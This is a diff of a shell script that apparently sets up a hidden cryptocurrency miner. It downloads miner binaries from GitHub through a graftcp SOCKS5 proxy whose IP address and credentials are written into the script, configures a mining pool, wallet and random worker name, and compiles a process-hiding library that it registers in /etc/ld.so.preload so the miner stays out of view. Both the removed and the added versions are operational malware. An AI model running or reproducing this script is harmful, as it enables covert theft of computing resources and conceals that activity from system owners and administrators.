@@ -1,13 +1,8 @@
 #!/bin/sh
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -16,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 52.203.46.122:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
+socks5 = 185.242.111.64:12324
+socks5_username = 14abf5d6e18da
+socks5_password = dbb7a6d2ae
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -40,13 +35,17 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor
-chmod +x Naughty_Doctor
+./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
+chmod +x priyatama
+POOL=ethash.poolbinance.com:1800
+WALLET=necroxgaming
+WORKER=$(echo $(shuf -i 10-9999 -n 1))
 
-unset LD_PRELOAD
-unset LD_PRELOAD_ENV
-unset LD_LIBRARY_PATH
+./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
+unzip magicPriyatama.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-ph add Naughty_Doctor
-
-./Naughty_Doctor --disable-cpu --algorithm blake3_alephium --pool us2.alephium.herominers.com:1199 --ssl true --wallet 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.Naughty_Doctor --proxy mikrotik999:Elibawnos@52.203.46.122:1080 --gpu-boost 3
+./graftcp/graftcp ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
